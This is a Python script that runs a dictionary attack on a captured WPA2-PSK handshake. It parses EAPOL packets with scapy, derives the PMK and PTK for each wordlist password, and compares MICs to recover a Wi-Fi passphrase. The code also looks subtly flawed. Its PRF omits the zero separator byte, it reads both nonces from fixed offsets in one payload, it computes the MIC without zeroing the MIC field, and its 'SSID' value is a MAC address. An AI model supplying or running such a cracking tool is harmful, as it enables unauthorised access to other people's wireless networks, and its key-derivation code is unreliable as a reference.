from scapy.all import rdpcap, Raw
from scapy.layers.eap import EAPOL
import hmac
import hashlib
from pbkdf2 import PBKDF2
import binascii

def derive_pmk(password, ssid):
    """ Derives the PMK (Pairwise Master Key) using PBKDF2 """
    return PBKDF2(password, ssid, 4096).read(32)

def derive_ptk(pmk, a_nonce, s_nonce, ap_mac, sta_mac):
    """ Derives the PTK (Pairwise Transient Key) from the PMK and handshake data """
    def custom_prf512(pmk, A, B):
        blen = 64
        R = b""
        i = 0
        while len(R) < blen:
            hmacsha1 = hmac.new(pmk, A + B + bytes([i]), hashlib.sha1)
            R += hmacsha1.digest()
            i += 1
        return R[:blen]

    A = b"Pairwise key expansion"
    B = min(ap_mac, sta_mac) + max(ap_mac, sta_mac) + a_nonce + s_nonce

    return custom_prf512(pmk, A, B)

def crack_wpa2_handshake(cap_file, ssid, wordlist):
    """ Crack WPA2-PSK using a dictionary attack """
    packets = rdpcap(cap_file)
    ap_mac = None
    sta_mac = None
    a_nonce = None
    s_nonce = None
    key_mic = None

    # Extract EAPOL handshake
    for packet in packets:
        if packet.haslayer(EAPOL):
            if ap_mac is None:
                ap_mac = packet.addr2  # Access Point MAC
                sta_mac = packet.addr1  # Station MAC
                print(f"AP MAC: {ap_mac}")
                print(f"STA MAC: {sta_mac}")

            # Retrieve raw payload
            raw_payload = packet[Raw].load
            print(f"Raw EAPOL Payload: {raw_payload.hex()}")  # Debugging line
            # Extract A Nonce
            if a_nonce is None:
                a_nonce = raw_payload[13:29]  # Extract A nonce from the handshake
                print(f"A Nonce: {a_nonce.hex()}")

            # Extract S Nonce
            if s_nonce is None:
                s_nonce = raw_payload[29:45]  # Extract S nonce from the handshake
                print(f"S Nonce: {s_nonce.hex()}")

            # Extract Key MIC (last 16 bytes of the key data)
            if key_mic is None:
                key_mic = raw_payload[-16:]  # Extract Key MIC from the end of the EAPOL payload
                print(f"Key MIC: {key_mic.hex()}")

    if ap_mac is None:
        print("No handshake found")
        return None

    ap_mac = binascii.unhexlify(ap_mac.replace(':', ''))
    sta_mac = binascii.unhexlify(sta_mac.replace(':', ''))

    # Attempt to crack the password
    with open(wordlist, 'r') as f:
        for password in f:
            password = password.strip().encode()
            pmk = derive_pmk(password, ssid)
            ptk = derive_ptk(pmk, a_nonce, s_nonce, ap_mac, sta_mac)

            # Use the entire raw payload for MIC calculation
            mic = hmac.new(ptk[0:16], raw_payload[:-16], hashlib.sha1).digest()  # Calculate MIC
            derived_mic_hex = mic.hex()

            print(f"Trying password: {password.decode()}")
            print(f"Derived MIC: {derived_mic_hex}")

            if derived_mic_hex == key_mic.hex():
                print(f"Password found: {password.decode()}")
                return password.decode()

    print("Password not found in wordlist")
    return None

if __name__ == "__main__":
    ssid = "50:B0:19:AE:21:EF"  # Replace with your SSID
    cap_file = "logs/log-01.cap"  # Replace with the path to your .cap file
    wordlist = "passlist.txt"  # Replace with the path to your wordlist file
    crack_wpa2_handshake(cap_file, ssid, wordlist)
